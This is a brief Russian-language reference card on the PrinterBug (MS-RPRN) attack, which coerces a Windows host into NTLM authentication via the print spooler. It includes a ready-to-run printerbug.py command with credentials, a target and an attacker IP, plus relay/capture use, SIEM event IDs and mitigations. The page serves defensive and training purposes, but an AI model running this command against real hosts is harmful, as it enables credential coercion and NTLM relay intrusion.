# PrinterBug (MS-RPRN)

## 🎯 Цель атаки
Вызвать NTLM-аутентификацию от жертвы через службу печати.

## 📋 Условия
- Включена служба печати (Spooler).
- Жертва в той же сети.

## 🔹 Пошагово
1. Запустить PrinterBug exploit:
```bash
python3 printerbug.py DOMAIN/user:pass@target attacker_ip
```
2. NTLM-аутентификация жертвы пойдёт на атакующего (для релея или перехвата).

## 📊 SIEM
- Event ID 4624/4625 (NTLM).
- RPC вызовы MS-RPRN.

## 🛡 Защита
- Отключить Spooler на DC/серверах.
- Ограничить RPC-доступ.
